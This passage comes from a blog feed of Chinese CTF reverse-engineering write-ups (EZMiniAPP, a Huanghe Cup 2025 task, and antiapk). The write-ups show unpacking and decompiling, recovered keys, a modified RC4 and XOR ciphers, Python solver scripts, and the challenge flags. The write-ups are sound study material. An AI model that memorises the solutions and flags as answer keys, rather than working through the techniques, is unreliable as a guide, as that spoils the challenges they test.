class="hljs-built_in">list</span>(struct.unpack_from(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>))<br>    tmp = tea_decrypt(tmp, Key)<br>    struct.pack_into(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>, *tmp)<br><br>    <span class="hljs-built_in">print</span>(cipher.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br>    <br>//flag&#123;unitygame_I5S0ooFunny_Isnotit?????&#125;<br></code></pre></td></tr></table></figure><h2 id="EZMiniAPP"><a href="#EZMiniAPP" class="headerlink" title="EZMiniAPP"></a>EZMiniAPP</h2><p>先查看一下发现没用加密过</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202511020059543.png" alt="image-20251102005908388"></p><p>然后用wxappUnpacker解包一下，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202511020100797.png" alt="image-20251102010033705"></p><p>在chunk_0.appservice.js中发现主要加密内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202511020102082.png" alt="image-20251102010232987"></p><p>密钥：newKey2025!</p><p>密文：[ 1, 33, 194, 133, 195, 102, 232, 104, 200, 14, 8, 163, 131, 71, 68, 97, 2, 76, 72, 171, 74,106, 225, 1, 65 ]</p><p>enigmaticTransformation(a, t)是实际的加密函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enigmaticTransformation</span>(<span class="hljs-params">a, t</span>) &#123;<br>     <span class="hljs-comment">//a：输入的flag</span><br>    <span class="hljs-comment">// t: 密钥key：&quot;newKey2025!&quot;</span><br><br>    <span class="hljs-keyword">let</span> r = [];<br>    <span class="hljs-keyword">let</span> i = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(t).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>));<br>    <span class="hljs-keyword">let</span> s = i.<span class="hljs-property">length</span>;<br><br>    <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> e = <span class="hljs-number">0</span>; e &lt; i.<span class="hljs-property">length</span>; e++) &#123;<br>        <span class="hljs-keyword">switch</span> (e % <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: sum += <span class="hljs-number">1</span> * i[e]; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: sum += i[e] + <span class="hljs-number">0</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: sum += <span class="hljs-number">0</span> | i[e]; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: sum += <span class="hljs-number">0</span> ^ i[e]; <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">let</span> c = sum % <span class="hljs-number">8</span>;<br><br>    <span class="hljs-comment">// 主循环</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> o = <span class="hljs-number">0</span>; o &lt; a.<span class="hljs-property">length</span>; o++) &#123;<br>        <span class="hljs-keyword">let</span> u;<br>        <span class="hljs-keyword">switch</span> (o % <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: u = a.<span class="hljs-title function_">charCodeAt</span>(o) ^ i[o % s]; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: u = i[o % s] ^ a.<span class="hljs-title function_">charCodeAt</span>(o); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: u = a.<span class="hljs-title function_">charCodeAt</span>(o) ^ i[o % s]; <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 根据 c 对 u 进行循环位移</span><br>        <span class="hljs-keyword">let</span> h;<br>        <span class="hljs-keyword">switch</span> (c) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: h = u; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: h = ((u &lt;&lt; <span class="hljs-number">1</span>) | (u &gt;&gt; <span class="hljs-number">7</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: h = ((u &lt;&lt; <span class="hljs-number">2</span>) | (u &gt;&gt; <span class="hljs-number">6</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: h = ((u &lt;&lt; <span class="hljs-number">3</span>) | (u &gt;&gt; <span class="hljs-number">5</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: h = ((u &lt;&lt; <span class="hljs-number">4</span>) | (u &gt;&gt; <span class="hljs-number">4</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: h = ((u &lt;&lt; <span class="hljs-number">5</span>) | (u &gt;&gt; <span class="hljs-number">3</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: h = ((u &lt;&lt; <span class="hljs-number">6</span>) | (u &gt;&gt; <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>: h = ((u &lt;&lt; <span class="hljs-number">7</span>) | (u &gt;&gt; <span class="hljs-number">1</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-attr">default</span>: h = ((u &lt;&lt; c) | (u &gt;&gt; (<span class="hljs-number">8</span> - c))) &amp; <span class="hljs-number">0xFF</span>;<br>        &#125;<br><br>        r.<span class="hljs-title function_">push</span>(h);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(r);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotl</span>(<span class="hljs-params">b, n</span>):<br>    n %= <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> ((b &lt;&lt; n) | (b &gt;&gt; (<span class="hljs-number">8</span> - n))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotr</span>(<span class="hljs-params">b, n</span>):<br>    n %= <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> ((b &gt;&gt; n) | (b &lt;&lt; (<span class="hljs-number">8</span> - n))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_c</span>(<span class="hljs-params">key_bytes</span>):<br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key_bytes):<br>        m = i % <span class="hljs-number">4</span><br>        <span class="hljs-keyword">if</span> m == <span class="hljs-number">0</span>:<br>            t += <span class="hljs-number">1</span> * b<br>        <span class="hljs-keyword">elif</span> m == <span class="hljs-number">1</span>:<br>            t += b + <span class="hljs-number">0</span><br>        <span class="hljs-keyword">elif</span> m == <span class="hljs-number">2</span>:<br>            t += <span class="hljs-number">0</span> | b<br>        <span class="hljs-keyword">else</span>:<br>            t += <span class="hljs-number">0</span> ^ b<br>    <span class="hljs-keyword">return</span> t % <span class="hljs-number">8</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">arr, key</span>):<br>    kb = [<span class="hljs-built_in">ord</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> key]<br>    c = calc_c(kb)<br>    out = []<br>    <span class="hljs-keyword">for</span> i, h <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(arr):<br>        u = rotr(h, c)<br>        out.append(u ^ kb[i % <span class="hljs-built_in">len</span>(kb)])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key = <span class="hljs-string">&quot;newKey2025!&quot;</span><br>    data = [<span class="hljs-number">1</span>,<span class="hljs-number">33</span>,<span class="hljs-number">194</span>,<span class="hljs-number">133</span>,<span class="hljs-number">195</span>,<span class="hljs-number">102</span>,<span class="hljs-number">232</span>,<span class="hljs-number">104</span>,<span class="hljs-number">200</span>,<span class="hljs-number">14</span>,<span class="hljs-number">8</span>,<span class="hljs-number">163</span>,<span class="hljs-number">131</span>,<span class="hljs-number">71</span>,<span class="hljs-number">68</span>,<span class="hljs-number">97</span>,<span class="hljs-number">2</span>,<span class="hljs-number">76</span>,<span class="hljs-number">72</span>,<span class="hljs-number">171</span>,<span class="hljs-number">74</span>,<span class="hljs-number">106</span>,<span class="hljs-number">225</span>,<span class="hljs-number">1</span>,<span class="hljs-number">65</span>]<br>    <span class="hljs-built_in">print</span>(decrypt(data, key))<br>   <br>//flag&#123;JustEasyMiniProgram&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>黄鹤杯2025</title>
    <link href="/2025/09/28/%E9%BB%84%E9%B9%A4%E6%9D%AF2025/"/>
    <url>/2025/09/28/%E9%BB%84%E9%B9%A4%E6%9D%AF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="系统调试"><a href="#系统调试" class="headerlink" title="系统调试"></a>系统调试</h1><p>.bin文件直接反编译，看到这里其实就是主逻辑，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509282135126.png" alt="image-20250928213452995"></p><p>sub_40074D函数是加密函数<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509282135164.png" alt="image-20250928213539087"></p><p>解密代码：密码是rotors</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">v7 = [<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]<br>password = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v7:<br>    char_code = i + <span class="hljs-number">109</span><br>    password.append(<span class="hljs-built_in">chr</span>(char_code))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密得到的密码是：&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(password))<br></code></pre></td></tr></table></figure><p>其实这就是最终的flag{rotors}</p><p>题外话：当时一直在分析rev1程序，思考这两个程序的联系，一直在想有什么办法找到环境变量，但是这题根本和这个没关系。也是逆天了，出这种题还是1000分的有什么意思。</p><h1 id="antiapk"><a href="#antiapk" class="headerlink" title="antiapk"></a>antiapk</h1><p>直接看java层吧，其实能看到两个.so文件，另一个libluajava.so，当时其实能推测出可能主逻辑和lua代码有关</p><p>在看JNI调用那些其实都是假的逻辑，在sub_9950函数能看到真实的逻辑</p><p>这个函数调用了lua jit去解密，密钥是82ns65ig1，最终比较的密文是95 01 3C 79 F8 4A 84 85 B6 2F 2E 9A F4 AB A5 73 </p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509292150104.png" alt="image-20250929215055046"></p><p>先从buf中提取出lua字节码，然后用</p><p><a href="https://github.com/marsinator358/luajit-decompiler-v2/releases/tag/Mar_24_2024%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%97%E5%88%B0lua%E4%BB%A3%E7%A0%81">https://github.com/marsinator358/luajit-decompiler-v2/releases/tag/Mar_24_2024反编译得到lua代码</a></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setText</span><span class="hljs-params">(arg_1_0, arg_1_1)</span></span><br>arg_1_0:setText(<span class="hljs-string">&quot;set by Lua: &quot;</span> .. arg_1_1)<br>arg_1_0:setTextSize(<span class="hljs-number">50</span>)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">tog</span><span class="hljs-params">(arg_2_0, arg_2_1)</span></span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span><span class="hljs-params">(arg_3_0, arg_3_1)</span></span><br><span class="hljs-keyword">return</span> arg_3_0 + arg_3_1<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">RSA</span><span class="hljs-params">(arg_4_0)</span></span><br><span class="hljs-keyword">local</span> var_4_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">len</span>(arg_4_0)<br><span class="hljs-keyword">local</span> var_4_1 = &#123;&#125;<br><span class="hljs-keyword">local</span> var_4_2 = &#123;&#125;<br><br><span class="hljs-keyword">for</span> iter_4_0 = <span class="hljs-number">0</span>, <span class="hljs-number">255</span> <span class="hljs-keyword">do</span><br>var_4_1[iter_4_0] = iter_4_0<br><span class="hljs-keyword">end</span><br><br>var_4_1[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span><br>var_4_1[<span class="hljs-number">8</span>] = <span class="hljs-number">57</span><br><br><span class="hljs-keyword">for</span> iter_4_1 = <span class="hljs-number">1</span>, var_4_0 <span class="hljs-keyword">do</span><br>var_4_2[iter_4_1 - <span class="hljs-number">1</span>] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">byte</span>(arg_4_0, iter_4_1, iter_4_1)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> var_4_3 = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> iter_4_2 = <span class="hljs-number">0</span>, <span class="hljs-number">255</span> <span class="hljs-keyword">do</span><br>var_4_3 = (var_4_3 + var_4_1[iter_4_2] + var_4_2[iter_4_2 % var_4_0]) % <span class="hljs-number">256</span><br>var_4_1[iter_4_2], var_4_1[var_4_3] = var_4_1[var_4_3], var_4_1[iter_4_2]<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> var_4_1<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PRGA</span><span class="hljs-params">(arg_5_0, arg_5_1)</span></span><br><span class="hljs-keyword">local</span> var_5_0 = <span class="hljs-number">0</span><br><span class="hljs-keyword">local</span> var_5_1 = <span class="hljs-number">0</span><br><span class="hljs-keyword">local</span> var_5_2 = &#123;&#125;<br><br><span class="hljs-keyword">for</span> iter_5_0 = <span class="hljs-number">1</span>, arg_5_1 <span class="hljs-keyword">do</span><br>var_5_0 = (var_5_0 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>var_5_1 = (var_5_1 + arg_5_0[var_5_0]) % <span class="hljs-number">256</span><br>arg_5_0[var_5_0], arg_5_0[var_5_1] = arg_5_0[var_5_1], arg_5_0[var_5_0]<br>var_5_2[iter_5_0] = arg_5_0[(arg_5_0[var_5_0] + arg_5_0[var_5_1]) % <span class="hljs-number">256</span>]<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> var_5_2<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">var_0_0</span><span class="hljs-params">(arg_6_0)</span></span><br>arg_6_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">gsub</span>(arg_6_0, <span class="hljs-string">&quot;(.)&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_7_0)</span></span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%02X &quot;</span>, <span class="hljs-built_in">string</span>.<span class="hljs-built_in">byte</span>(arg_7_0))<br><span class="hljs-keyword">end</span>)<br><br><span class="hljs-keyword">return</span> arg_6_0<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">RSB</span><span class="hljs-params">(arg_8_0, arg_8_1, arg_8_2)</span></span><br><span class="hljs-keyword">local</span> var_8_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">len</span>(arg_8_2)<br><span class="hljs-keyword">local</span> var_8_1 = RSA(arg_8_1)<br><span class="hljs-keyword">local</span> var_8_2 = PRGA(var_8_1, var_8_0)<br><br><span class="hljs-keyword">return</span> var_0_0(sxor(arg_8_0, var_8_2, arg_8_2))<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sxor</span><span class="hljs-params">(arg_9_0, arg_9_1, arg_9_2)</span></span><br><span class="hljs-keyword">local</span> var_9_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">len</span>(arg_9_2)<br><span class="hljs-keyword">local</span> var_9_1<br><span class="hljs-keyword">local</span> var_9_2 = &#123;&#125;<br><br><span class="hljs-keyword">for</span> iter_9_0 = <span class="hljs-number">1</span>, var_9_0 <span class="hljs-keyword">do</span><br><span class="hljs-keyword">local</span> var_9_3 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">byte</span>(arg_9_2, iter_9_0, iter_9_0)<br><br>var_9_2[iter_9_0] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">char</span>(bxor(arg_9_1[iter_9_0], var_9_3))<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">table</span>.<span class="hljs-built_in">concat</span>(var_9_2)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> var_0_1 = &#123;<br>cond_and = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_10_0, arg_10_1)</span></span><br><span class="hljs-keyword">return</span> arg_10_0 + arg_10_1 == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span>,<br>cond_xor = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_11_0, arg_11_1)</span></span><br><span class="hljs-keyword">return</span> arg_11_0 + arg_11_1 == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span>,<br>cond_or = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_12_0, arg_12_1)</span></span><br><span class="hljs-keyword">return</span> arg_12_0 + arg_12_1 &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">var_0_1.base</span><span class="hljs-params">(arg_13_0, arg_13_1, arg_13_2)</span></span><br><span class="hljs-keyword">if</span> arg_13_1 &lt; arg_13_2 <span class="hljs-keyword">then</span><br>arg_13_1, arg_13_2 = arg_13_2, arg_13_1<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> var_13_0 = <span class="hljs-number">0</span><br><span class="hljs-keyword">local</span> var_13_1 = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">while</span> arg_13_1 ~= <span class="hljs-number">0</span> <span class="hljs-keyword">do</span><br>r_a = arg_13_1 % <span class="hljs-number">2</span><br>r_b = arg_13_2 % <span class="hljs-number">2</span><br>var_13_0 = var_13_1 * var_0_1[arg_13_0](r_a, r_b) + var_13_0<br>var_13_1 = var_13_1 * <span class="hljs-number">2</span><br>arg_13_1 = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">modf</span>(arg_13_1 / <span class="hljs-number">2</span>)<br>arg_13_2 = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">modf</span>(arg_13_2 / <span class="hljs-number">2</span>)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> var_13_0<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bxor</span><span class="hljs-params">(arg_14_0, arg_14_1)</span></span><br><span class="hljs-keyword">return</span> var_0_1.base(<span class="hljs-string">&quot;cond_xor&quot;</span>, arg_14_0, arg_14_1)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">band</span><span class="hljs-params">(arg_15_0, arg_15_1)</span></span><br><span class="hljs-keyword">return</span> var_0_1.base(<span class="hljs-string">&quot;cond_and&quot;</span>, arg_15_0, arg_15_1)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bor</span><span class="hljs-params">(arg_16_0, arg_16_1)</span></span><br><span class="hljs-keyword">return</span> var_0_1.base(<span class="hljs-string">&quot;cond_or&quot;</span>, arg_16_0, arg_16_1)<br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><p>主要逻辑是rc4，但把s-box和位运算做了魔改</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">ciphertext: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    S[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span><br>    S[<span class="hljs-number">8</span>] = <span class="hljs-number">57</span><br><br>    key_bytes = key.encode()<br>    key_len = <span class="hljs-built_in">len</span>(key_bytes)<br><br><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key_bytes[i % key_len]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br><br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    keystream = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ciphertext)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        keystream.append(k)<br><br><br>    plaintext = <span class="hljs-built_in">bytes</span>([c ^ k <span class="hljs-keyword">for</span> c, k <span class="hljs-keyword">in</span> <span 